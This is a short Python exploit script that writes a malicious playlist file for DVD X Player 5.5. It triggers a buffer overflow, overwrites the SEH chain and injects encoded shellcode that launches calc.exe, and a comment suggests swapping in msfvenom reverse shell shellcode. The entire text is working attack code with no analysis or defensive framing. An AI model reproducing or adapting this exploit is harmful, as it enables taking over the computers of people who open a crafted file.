#!/usr/bin/python
# creates a malicious playlist file for DVD X Player 5.5
# achieves a buffer overflow and attacks the SEH chain to inject shellcode
filename = "evil.plf"

# this shellcode just runs calc.exe as proof that exploit works
# can use msfvenom to generate reverse shell shellcode
shellcode = (
"\xb8\x8c\x8e\xaa\xa9\xda\xd0\xd9\x74\x24\xf4\x5b\x33"
"\xc9\xb1\x31\x31\x43\x13\x83\xc3\x04\x03\x43\x83\x6c"
"\x5f\x55\x73\xf2\xa0\xa6\x83\x93\x29\x43\xb2\x93\x4e"
"\x07\xe4\x23\x04\x45\x08\xcf\x48\x7e\x9b\xbd\x44\x71"
"\x2c\x0b\xb3\xbc\xad\x20\x87\xdf\x2d\x3b\xd4\x3f\x0c"
"\xf4\x29\x41\x49\xe9\xc0\x13\x02\x65\x76\x84\x27\x33"
"\x4b\x2f\x7b\xd5\xcb\xcc\xcb\xd4\xfa\x42\x40\x8f\xdc"
"\x65\x85\xbb\x54\x7e\xca\x86\x2f\xf5\x38\x7c\xae\xdf"
"\x71\x7d\x1d\x1e\xbe\x8c\x5f\x66\x78\x6f\x2a\x9e\x7b"
"\x12\x2d\x65\x06\xc8\xb8\x7e\xa0\x9b\x1b\x5b\x51\x4f"
"\xfd\x28\x5d\x24\x89\x77\x41\xbb\x5e\x0c\x7d\x30\x61"
"\xc3\xf4\x02\x46\xc7\x5d\xd0\xe7\x5e\x3b\xb7\x18\x80"
"\xe4\x68\xbd\xca\x08\x7c\xcc\x90\x46\x83\x42\xaf\x24"
"\x83\x5c\xb0\x18\xec\x6d\x3b\xf7\x6b\x72\xee\xbc\x84"
"\x38\xb3\x94\x0c\xe5\x21\xa5\x50\x16\x9c\xe9\x6c\x95"
"\x15\x91\x8a\x85\x5f\x94\xd7\x01\xb3\xe4\x48\xe4\xb3"
"\x5b\x68\x2d\xd0\x3a\xfa\xad\x39\xd9\x7a\x57\x46")

# NOP slide into shellcode to ensure shellcode execution
evil = '\x90'*20 + shellcode

# buffer overflow and SEH chain modification
buffer = "A"*608 + '\xEB\x06\x90\x90' + '\x2E\x17\x64\x61' + evil + "D"*(1384-len(evil))

# save malicious playlist file
file = open(filename, 'w')
file.write(buffer)
file.close()
